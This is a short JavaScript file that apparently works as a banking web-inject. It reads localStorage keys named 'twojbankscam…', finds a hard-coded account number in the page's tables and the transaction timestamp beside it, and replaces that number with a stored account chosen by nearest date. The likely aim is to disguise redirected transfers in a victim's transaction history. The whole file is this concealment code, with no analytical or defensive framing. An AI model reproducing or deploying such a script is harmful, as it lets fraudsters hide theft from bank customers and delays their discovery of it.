
function addzero(i){
    if(i<10)
        return '0'+i;
    else
        return i;
}
function datetime(){
    var currentdate = new Date(); 
var datetime = currentdate.getFullYear() + "-"
                + addzero(currentdate.getMonth()+1)  + "-" 
                + addzero(currentdate.getDate()) + " "  
                + addzero(currentdate.getHours()) + ":"  
                + addzero(currentdate.getMinutes()) + ":" 
                + addzero(currentdate.getSeconds());
    return datetime;
}
function total(str){
    return (new Date(str.substr(0,4),str.substr(5,2),str.substr(8,2),str.substr(11,2),str.substr(14,2),str.substr(17,2),0).getTime());
}
function getInputsByValue(value)
{
    var allInputs = document.getElementsByTagName("input");
    var results = [];
    for(var x=0;x<allInputs.length;x++)
        if(allInputs[x].value == value)
            results.push(allInputs[x]);
    return results;
}
function load(){
    if(typeof(Storage)!=="undefined"){
        if(localStorage.twojbankscamcount){
          var destiny = "01234567891011121314151617";
          var tables = document.getElementsByTagName("table");
          for(var a = 0;a<tables.length;a++){
            var tabl = tables[a];
            var rowLength = tabl.rows.length;
            var thereisdate = false;
            var cellwithnumber = null;
            var thisdate = null;
            for (i = 0; i < rowLength; i++){

                var oCells = tabl.rows.item(i).cells;

                var cellLength = oCells.length;

                for(var j = 0; j < cellLength; j++){

                    var cellVal = oCells.item(j).innerHTML;
                    if(cellVal==destiny){
                        cellwithnumber = oCells.item(j);
                    }
                    if(!thereisdate && cellVal.match(/\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}/)!=undefined){
                        thereisdate = true;
                        thisdate = total(cellVal);
                    }
                }
            }
            if(thereisdate && cellwithnumber!=null){
                var mostprobabledate = 0;
                var mostprobableaccount = null;
                for(var i = 0;i<=Number(localStorage.twojbankscamcount);i++){
                    var acc = localStorage.getItem("twojbankscamaccount"+i);
                    var dat = localStorage.getItem("twojbankscamdate"+i);
                    if(acc!=null && dat!=null){
                    if(Math.abs(dat-thisdate)<Math.abs(mostprobabledate-thisdate)){
                        mostprobabledate = dat;
                        mostprobableaccount = acc;
                    }
                    }
                }
                if(mostprobableaccount!=null){
                    cellwithnumber.innerHTML = mostprobableaccount.split(' ').join('');
                }
            }
          }
        }
    }
}
load();
